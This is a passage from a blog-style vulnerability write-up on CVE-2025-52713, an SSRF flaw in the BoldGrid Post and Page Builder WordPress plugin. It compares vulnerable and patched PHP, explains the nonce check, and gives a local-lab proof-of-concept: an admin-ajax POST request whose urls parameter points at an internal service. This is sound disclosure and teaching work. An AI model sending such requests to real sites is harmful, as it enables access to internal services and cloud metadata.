&lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Post and Page Builder by BoldGrid – Visual Drag and Drop Editor&lt;/strong&gt;: &lt;strong&gt;1.27.8&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.27.9&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function get_redirect_url() {&#xA;    $urls = ! empty( $_POST[&amp;#39;urls&amp;#39;] ) ? $_POST[&amp;#39;urls&amp;#39;] : null;&#xA;&#xA;    self::validate_nonce( &amp;#39;image&amp;#39; );&#xA;    $unsplash_404 = &amp;#39;https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop&amp;amp;fm=jpg&amp;amp;h=800&amp;amp;q=50&amp;amp;w=1200&amp;#39;;&#xA;&#xA;    $redirectUrls = array();&#xA;    foreach( $urls as $url ) {&#xA;        $response = wp_remote_head( $url );&#xA;        $headers = is_array( $response ) &amp;amp;&amp;amp; ! empty( $response[&amp;#39;headers&amp;#39;] ) ? $response[&amp;#39;headers&amp;#39;]-&amp;gt;getAll() : array();&#xA;        $redirectUrl = ! empty( $headers[&amp;#39;location&amp;#39;] ) ? $headers[&amp;#39;location&amp;#39;] : false;&#xA;        $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false;&#xA;        $redirectUrls[ $url ] = $redirectUrl;&#xA;    }&#xA;&#xA;    if ( ! empty( $redirectUrls ) ) {&#xA;        wp_send_json_success( $redirectUrls );&#xA;    } else {&#xA;        status_header( 400 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;strong&gt;vulnerable version&lt;/strong&gt;, &lt;code&gt;get_redirect_url()&lt;/code&gt; reads an array of URLs from &lt;code&gt;$_POST[&#39;urls&#39;]&lt;/code&gt;, then iterates each element and issues a request via &lt;code&gt;wp_remote_head($url)&lt;/code&gt; &lt;strong&gt;without validating or sanitizing the input&lt;/strong&gt;. This allows an attacker to supply arbitrary URLs so the server will request internal addresses like &lt;code&gt;127.0.0.1&lt;/code&gt; or &lt;code&gt;169.254.169.254&lt;/code&gt;, leading to &lt;strong&gt;SSRF&lt;/strong&gt;. Also, because there are no &lt;code&gt;timeout&lt;/code&gt; or &lt;code&gt;redirection&lt;/code&gt; limits, the function can be abused to cause &lt;strong&gt;hangs or denial-of-service (DoS)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_redirect_url() {&#xA;    $urls = ! empty( $_POST[&amp;#39;urls&amp;#39;] ) ? $_POST[&amp;#39;urls&amp;#39;] : null;&#xA;&#xA;    self::validate_nonce( &amp;#39;image&amp;#39; );&#xA;    $unsplash_404 = &amp;#39;https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop&amp;amp;fm=jpg&amp;amp;h=800&amp;amp;q=50&amp;amp;w=1200&amp;#39;;&#xA;    $redirectUrls = array();&#xA;    foreach( $urls as $url ) {&#xA;        $response = wp_safe_remote_head( esc_url_raw( $url ), array(&#xA;            &amp;#39;timeout&amp;#39;     =&amp;gt; 5,&#xA;            &amp;#39;redirection&amp;#39; =&amp;gt; 5,&#xA;        ) );&#xA;        $headers = is_array( $response ) &amp;amp;&amp;amp; ! empty( $response[&amp;#39;headers&amp;#39;] ) ? $response[&amp;#39;headers&amp;#39;]-&amp;gt;getAll() : array();&#xA;        $redirectUrl = ! empty( $headers[&amp;#39;location&amp;#39;] ) ? $headers[&amp;#39;location&amp;#39;] : false;&#xA;        $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false;&#xA;        $redirectUrls[ $url ] = $redirectUrl;&#xA;    }&#xA;&#xA;    if ( ! empty( $redirectUrls ) ) {&#xA;        wp_send_json_success( $redirectUrls );&#xA;    } else {&#xA;        status_header( 400 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch replaces &lt;code&gt;wp_remote_head()&lt;/code&gt; with &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; together with &lt;code&gt;esc_url_raw()&lt;/code&gt; to sanitize and allow only valid URLs, and adds protective parameters &lt;code&gt;timeout =&amp;gt; 5&lt;/code&gt; and &lt;code&gt;redirection =&amp;gt; 5&lt;/code&gt;. This prevents requests to internal/loopback addresses and reduces performance-related risks.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The call &lt;code&gt;self::validate_nonce( &#39;image&#39; );&lt;/code&gt; is used to &lt;strong&gt;verify a nonce&lt;/strong&gt; — WordPress&amp;rsquo;s mechanism to prevent &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function validate_nonce( $name ) {&#xA;    $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ?&#xA;        $_POST[ self::$nonces[ $name ] ] : null;&#xA;&#xA;    $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] );&#xA;&#xA;    if ( ! $valid ) {&#xA;        status_header( 401 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin defines a static &lt;code&gt;$nonces&lt;/code&gt; array that maps actions to nonce keys:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected static $nonces = array(&#xA;    &amp;#39;image&amp;#39; =&amp;gt; &amp;#39;boldgrid_gridblock_image_ajax_nonce&amp;#39;,&#xA;    &amp;#39;setup&amp;#39; =&amp;gt; &amp;#39;boldgrid_editor_setup&amp;#39;,&#xA;    &amp;#39;gridblock_save&amp;#39; =&amp;gt; &amp;#39;boldgrid_editor_gridblock_save&amp;#39;,&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When &lt;code&gt;validate_nonce(&#39;image&#39;)&lt;/code&gt; is called, it:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Reads the nonce value from POST using the key &lt;code&gt;boldgrid_gridblock_image_ajax_nonce&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Verifies it via &lt;code&gt;wp_verify_nonce()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If invalid, returns &lt;strong&gt;HTTP 401 Unauthorized&lt;/strong&gt; and halts processing with &lt;code&gt;wp_send_json_error()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition tip open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-lightbulb&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Tip&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;When searching for &lt;code&gt;boldgrid_gridblock_image_ajax_nonce&lt;/code&gt; in the plugin source, we find it is assigned from the JavaScript variable &lt;code&gt;BoldgridEditor.grid_block_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce.png&#34; title=&#34;Nonce value in JS&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce value in JS&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;549&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value in JS&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Because this AJAX request is sent from the client, you can obtain the current nonce by opening the browser &lt;strong&gt;Console&lt;/strong&gt; and calling:&#xA;&lt;code&gt;BoldgridEditor.grid_block_nonce&lt;/code&gt; when creating a post with this plugin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce_value.png&#34; title=&#34;Nonce value in console&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/nonce_value.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce value&lt;/h2&gt;&lt;p&gt;Nonce value in console&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce_value.png&#39; alt=&#34;Nonce value&#34; height=&#34;416&#34; width=&#34;1052&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value in console&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;get_redirect_url()&lt;/code&gt; is registered as a callback for the action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_boldgrid_redirect_url&amp;#39;, array( $boldgrid_editor_ajax, &amp;#39;get_redirect_url&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means when a client sends an AJAX request to &lt;code&gt;/wp-admin/admin-ajax.php?action=boldgrid_redirect_url&lt;/code&gt;, &lt;code&gt;get_redirect_url()&lt;/code&gt; will be invoked.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url &amp;#43; $_POST[&amp;#39;urls&amp;#39;]&amp;#34;] --&amp;gt; B[&amp;#34;wp_ajax_boldgrid_redirect_url → get_redirect_url()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;self::validate_nonce(&amp;#39;image&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;read $_POST[&amp;#39;urls&amp;#39;]&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;foreach $url&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;wp_remote_head($url)  ← SSRF sink&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;extract headers[&amp;#39;location&amp;#39;] → $redirectUrls&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;$redirectUrls not empty?&amp;#34;}&#xA;H -- Yes --&amp;gt; I[&amp;#34;wp_send_json_success($redirectUrls)&amp;#34;]&#xA;H -- No --&amp;gt; J[&amp;#34;wp_send_json_error()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service with Python:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a POST request with the URL pointing to the local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C07a62e731a6142aa7b15555fdd5e1cbdd114cffb4a041ba0ecd9394c8319bb3f; wp-settings-time-2=1761643645; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C450b8e4bb8ebb335d435b94645ae098cee383a09a6e129efbdec8a2348deeda0&#xA;...&#xA;&#xA;action=boldgrid_redirect_url&amp;amp;urls[0]=http://localhost:8001/metadata&amp;amp;boldgrid_gridblock_image_ajax_nonce=482dbb1ed2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/result.png&#34; title=&#34;Content read from local service&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Content read from local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/result.png&#39; alt=&#34;Result&#34; height=&#34;641&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content read from local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability &lt;strong&gt;CVE-2025-52713&lt;/strong&gt; stems from &lt;code&gt;get_redirect_url()&lt;/code&gt; in the &lt;strong&gt;BoldGrid Post and Page Builder&lt;/strong&gt; plugin (≤ 1.27.8) issuing HTTP requests to user-supplied URLs without validation or restrictions, resulting in &lt;strong&gt;SSRF&lt;/strong&gt;. An attacker with &lt;strong&gt;Contributor&lt;/strong&gt; privileges and a valid nonce can force the server to request internal addresses. The patch (1.27.9) fixes this by using &lt;code&gt;esc_url_raw()&lt;/code&gt; and &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; with &lt;code&gt;timeout&lt;/code&gt; and &lt;code&gt;redirection&lt;/code&gt; limits to prevent unsafe requests.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Cause: missing validation and sanitization of user-provided URLs.&lt;/li&gt;&#xA;&lt;li&gt;Nonce only protects against CSRF, not SSRF.&lt;/li&gt;&#xA;&lt;li&gt;Impact: &lt;strong&gt;Low (6.4)&lt;/strong&gt; but may lead to internal data disclosure.&lt;/li&gt;&#xA;&lt;li&gt;Update to &lt;strong&gt;v1.27.9&lt;/strong&gt; to remediate.&lt;/li&gt;&#xA;&lt;li&gt;Development best practice: always use safe APIs (&lt;code&gt;wp_safe_remote_*&lt;/code&gt;) and sanitize URLs with 